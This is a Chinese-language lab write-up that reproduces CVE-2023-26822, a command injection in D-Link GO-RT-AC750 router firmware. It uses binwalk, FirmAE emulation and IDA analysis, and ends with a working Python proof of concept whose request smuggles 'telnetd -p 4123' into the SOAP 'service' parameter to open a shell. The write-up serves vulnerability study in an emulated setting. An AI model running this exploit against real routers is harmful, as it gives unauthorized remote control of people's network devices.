# 复现CVE-2023-26822命令注入漏洞

## 实验目标

以D-Link Go-RT-AC750固件为例，复现CVE-2023-26822命令注入漏洞，练习使用binwalk进行固件提取，使用FirmAE模拟固件

## 漏洞介绍及原理

1. CVE-2023-26822介绍

   D-Link GO-RT-AC750是D-Link公司的一款无线双频简易路由器。D-Link Go-RT-AC750 revA_v101b03版本存在安全漏洞，该漏洞源于通过soapcgi.main的service参数发现包含命令注入漏洞。

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/6c826c8e-0b4a-41df-bcaf-8a814748429b)


2. 漏洞原理

   根据漏洞披露的信息可知漏洞点和 service 参数以及 soapcgi_main 有关，在文件系统中查找soapcgi_main并定位到所在文件cgibin，将其拿到IDA中逆向分析，通过函数名查找，定位到soapcgi_main函数，调用该函数的代码如下：

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/10fb1be4-46b2-4bbe-9797-fd0f39031a29)


   soapcgi_main中关键代码如下：

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/f8f2d30e-31ca-41b7-84af-fb7d7f6ce7df)


   以上代码在获取与请求相关的环境变量，可获得的信息有：

   - REQUEST_METHOD: POST
   - CONTEXT_TYPE: text/xml
   - REQUEST_URI：含`?service=`
   - HTTP_SOAPACTION：含有“”，且“”中含有`#`

   与漏洞相关的代码部分：

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/dac2e480-3dea-4a98-884e-f1bee2e7759c)


   综上分析可知，漏洞出现的原因是POST 的URI中`?service=`后面的内容可由输入控制，全程没有对该处输入进行检查，直接sprintf后由system函数执行。

## 实验步骤

1. FirmAE 工具安装

   （1）首先拉取FirmAE 工具仓库，运行命令：

   `git clone --recursive https://github.com/pr0v3rbs/FirmAE`

   得到

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/0df2334d-1143-41fd-a6ef-b9f5903d4247)

   ​	（2）运行下载脚本

   运行以下代码，下载需要的资源

   ```
   cd FirmAE/
   ./download.sh
   ```

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/eb820839-b498-463a-88db-92009f2015ee)


   ​	（3）在上一条命令执行结束之后（输出Done !），运行./install.sh进行安装

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/fc4121c0-4416-4ff8-b079-8ffda1f5b6e2)


   执行结束：

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/c476e4b7-7d20-463f-8656-53922bb06d93)


2. 下载固件

   本文模拟的是设备型号为Go-RT-AC750，固件版本：revA_v101b03

   （1）文档地址：https://eu.dlink.com/uk/en/products/go-rt-ac750-wireless-ac750-dual-band-easy-router

   下载成功，得到GORTAC750_A1_FW_v101b03.bin固件文件


3. FirmAE工具初始化

   在FirmAE工具目录下执行./init.sh进行初始化

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/c62cca7d-b158-462d-a6b6-50a4dca99455)


4. 安装binwalk

   使用FirmAE工具目录下的binwalk安装程序进行安装：

   ```
   cd binwalk-2.3.4/
   
   python3 setup.py install
   ```

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/0cee9828-2937-4781-805c-22320d375295)


5. 模拟运行固件

   执行如下命令对固件进行解压

   ```
   binwalk -Me /home/zhangyutong/GORTAC750_A1_FW_v101b03.bin 
   ```

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/30b50cbc-f423-48c9-b537-586ab323d7e4)


   执行如下命令来模拟运行固件

   ```
   cd ..
   sudo ./run.sh -r GORTAC750 /home/yutong/GORTAC750_A1_FW_v101b03.bin
   ```

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/0e4f32d5-8943-4342-ae4c-7b8ab54849c4)


6. 执行脚本文件获取shell

   ```
   python3 poc.py
   ```

   成功拿到shell

   ![image](https://github.com/zhangyutong-sjtu/ctf-web/assets/75147791/b1b49deb-b89b-498a-8232-f065ef055d9b)


   poc.py文件如下所示：

   ```python
   from socket import *
   from os import *
   from time import *
   
   request = b"POST /soap.cgi?service=&&telnetd -p 4123& HTTP/1.1\r\n"
   request += b"Host: localhost:49152\r\n"
   request += b"Content-Type: text/xml\r\n"
   request += b"Content-Length: 88\r\n"
   request += b"SOAPAction: a#b\r\n\r\n"
   s = socket(AF_INET, SOCK_STREAM)
   s.connect((gethostbyname("192.168.0.1"), 49152))
   s.send(request)
   sleep(10)
   system('telnet 192.168.0.1 4123')
   ```

   

​	
